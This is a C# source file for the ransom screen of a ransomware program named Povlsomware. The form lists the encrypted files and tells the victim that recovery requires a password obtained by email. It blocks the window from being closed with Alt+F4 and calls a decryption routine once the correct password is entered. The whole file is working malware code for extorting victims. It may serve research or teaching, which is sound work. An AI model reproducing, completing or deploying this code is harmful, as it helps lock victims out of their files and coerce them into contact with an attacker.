using System;
using System.Windows.Forms;

namespace Povlsomware
{
    public partial class PayM3 : Form
    {
        private bool success = false;

        public PayM3()
        {
            InitializeComponent();

            label2.Text = Program.count.ToString() + " files have been encrypted";
            listBox1.Items.AddRange(Program.encryptedFiles.ToArray());
            textBox2.Text = 
                "Your files can only be retrived by entering the correct password. \n\r" +
                "In order to get the password please send a mail to \n\r" +
                "no-reply@forgetit.com.";
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            string input = textBox1.Text;

            if (input == Program.GetPass())
            {
                success = true;
                button1.Text = "Decrypting... Please wait";
                backgroundWorker1.RunWorkerAsync(input);
            }
            else
            {
                textBox1.Text = string.Empty;
                ActiveControl = textBox1;
                button1.Text = "Wrong Password... ";
            }
        }



        private void Screen_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Block window from being closed using Alt + F4
            if (!success)
                e.Cancel = true;
        }

        private void PayM3_Load(object sender, EventArgs e)
        {
            // Make this the active window
            //WindowState = FormWindowState.Minimized;
            Show();
        }

        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            string input = e.Argument as string;
            Program.UndoAttack(input);

        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Application.Exit();
        }
    }
}
